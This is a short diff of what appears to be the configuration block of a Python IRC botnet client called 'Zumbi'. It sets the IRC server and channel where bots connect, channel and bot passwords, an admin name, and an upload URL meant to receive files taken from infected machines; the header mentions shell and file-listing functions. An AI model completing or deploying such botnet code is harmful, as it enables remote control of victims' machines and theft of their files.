@@ -20,7 +20,7 @@ import time                                       # Funcoes listArq(), shell(), 
 
 ircServer= "chat.freenode.net"                    # Endereco do servidor IRC.
 ircChanne= "#amarula4242"                         # Canal ao qual o Zumbi ira se conectar.
-ircPwdCha= "@nolimits42"                          # Password do canal, caso nao haja, deixar em branco.
+ircPwdCha= "senhadocanal"                         # Password do canal, caso nao haja, deixar em branco.
 botAdmi= "Papa Father"                            # Nome que os Zumbis usarao para chamar voce (nao obrigatorio)
 botPass= "raise"                                  # Password para se conectar aos bots no canal
 urlUpload = "https://seusite.com/upload.php"      # Array PHP que ira receber os arquivos via upload
